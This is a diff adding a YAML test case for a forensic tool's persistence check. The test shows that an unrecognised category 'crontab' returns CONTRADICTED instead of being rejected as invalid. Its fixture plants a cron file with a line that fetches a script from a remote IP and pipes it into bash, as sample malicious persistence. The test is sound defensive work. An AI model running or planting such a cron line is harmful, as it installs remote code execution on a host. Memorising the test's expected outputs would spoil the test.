@@ -1,0 +1,36 @@
+# Matrix case P2061-001: verify_finding's persistence_mechanism_exists does
+# not check params.category against the documented list (cron, systemd, ...).
+# An unknown value such as "crontab" just finds no high-severity findings of
+# that exact string and returns CONTRADICTED, as if the evidence showed there
+# is no such persistence.
+case_id: P2061-001
+problem: P2061
+server: findevil
+variant: findevil-d1a8d25
+commit: d1a8d25d9c8c05bd66881506cb1f12314ee7c5e1
+display: response
+level: mcp
+realism: possible
+coverage: full
+summary: With a malicious cron job in the evidence, verify_finding(persistence_mechanism_exists, category "crontab") is not rejected as an unknown category but returns CONTRADICTED, "no high-severity crontab persistence", while category "cron" on the same root returns SUPPORTED.
+fixture:
+  - path: fs/etc/cron.d/sysupdate
+    text: "* * * * * root curl -s http://203.0.113.7/x.sh | bash\n"
+steps:
+  - tool: verify_finding
+    args:
+      claim_type: persistence_mechanism_exists
+      params: "{\"fs_root\": \"${EVIDENCE}/fs\", \"category\": \"crontab\"}"
+  - tool: verify_finding
+    args:
+      claim_type: persistence_mechanism_exists
+      params: "{\"fs_root\": \"${EVIDENCE}/fs\", \"category\": \"cron\"}"
+expect:
+  - step: 1
+    contains: "**Verdict:** CONTRADICTED"
+  - step: 1
+    contains: "no high-severity crontab persistence"
+  - step: 1
+    not_regex: "(?i)unknown category|invalid category|must be one of"
+  - step: 2
+    contains: "**Verdict:** SUPPORTED"
